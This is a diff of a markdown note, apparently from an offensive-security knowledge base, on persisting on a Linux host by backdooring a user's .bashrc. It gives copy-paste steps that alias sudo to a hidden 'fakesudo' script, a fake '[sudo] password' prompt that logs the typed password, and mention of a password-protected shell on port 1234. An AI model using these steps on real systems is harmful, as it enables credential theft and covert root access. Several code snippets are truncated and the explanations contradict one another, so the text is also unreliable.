@@ -40,11 +40,15 @@ From a technical perspective, the attacker modifies the bashrc file of a user to
 
 From a business perspective, this technique can be used to maintain access to a compromised system, steal sensitive data, or perform other malicious activities. It is important to secure systems against this type of attack to prevent data breaches and other security incidents.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
 
 1. Ability to modify the bashrc file of a user
+
+ 
 
 ## Defense
 
@@ -54,6 +58,8 @@ From a business perspective, this technique can be used to maintain access to a 
 
 1. Use endpoint protection software to detect and prevent this type of attack
 
+ 
+
 ## Objectives
 
 1. Maintain access to a compromised system
@@ -62,20 +68,36 @@ From a business perspective, this technique can be used to maintain access to a 
 
 1. Perform other malicious activities
 
+ 
+
 # Instructions
 
 1. To use this command, copy and paste it into the terminal and run it. Once executed, you can use the sudo command to open a backdoor shell by entering the password specified during the execution of this command.
 
+ 
+
+
+
 **Code**: [[TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-]]
+
+
 
 > This command creates a backdoor shell by setting an alias for sudo command to listen on port 1234 and execute /bin/bash. The shell is password protected, and the password is entered by the user when the sudo command is used. This can be used to gain root access to the system.
 
 2. To create an alias for fakesudo in bash, run the following commands:
 
+ 
+
+
+
 **Code**: [[$ chmod u+x ~/.hidden/fakesudo
 $ echo "alias sudo=]]
 
+
+
 > The first command sets the execute permission for the fakesudo script located in the .hidden directory. The second command adds an alias for sudo to the .bashrc file which points to the fakesudo script. This allows the user to run sudo commands through the fakesudo script, which can be used to log sudo usage and enforce sudo password policies.
+
+
 
 **Command** ([[Make fakesudo executable]]):
 
@@ -83,17 +105,31 @@ $ echo "alias sudo=]]
 $ chmod u+x ~/.hidden/fakesudo
 ```
 
+
+
+
+
 **Command** ([[Create sudo alias]]):
 
 ```bash
 $ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
 ```
 
+
+
 3. The 'fakesudo' command is a fake version of the 'sudo' command in Linux. It allows a user to execute commands with superuser privileges without entering a password. This command is not recommended for use in production environments.
+
+ 
+
+
 
 **Code**: [[fakesudo]]
 
+
+
 > The 'fakesudo' command takes in the same arguments as the 'sudo' command. It allows the user to execute a command with elevated privileges, as if they were the root user. This can be useful for performing administrative tasks or running commands that require elevated permissions. However, it is important to use this command with caution, as it can potentially cause damage to the system if used improperly.
+
+
 
 **Command** ([[Print message]]):
 
@@ -101,10 +137,18 @@ $ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
 fakesudo echo 'You do not have the necessary permissions to run this command'
 ```
 
+
+
 4. This command prompts the user for their sudo password and logs the password to a file. It then executes the command with sudo privileges. The command can take any arguments that would normally be passed to sudo.
+
+ 
+
+
 
 **Code**: [[read -sp "[sudo] password for $USER: " sudopass
 ec]]
+
+
 
 > The `read` command prompts the user for their sudo password and stores it in the variable `sudopass`. The `-s` option ensures that the password is not displayed as the user types it. The `-p` option displays the prompt `[sudo] password for $USER:`.
 
@@ -141,3 +185,5 @@ The final command `/usr/bin/sudo $@` executes the command with sudo privileges. 
 
 - [[Backdooring a user's bash_rc]]
 - [[Linux - Persistence]]
+
+
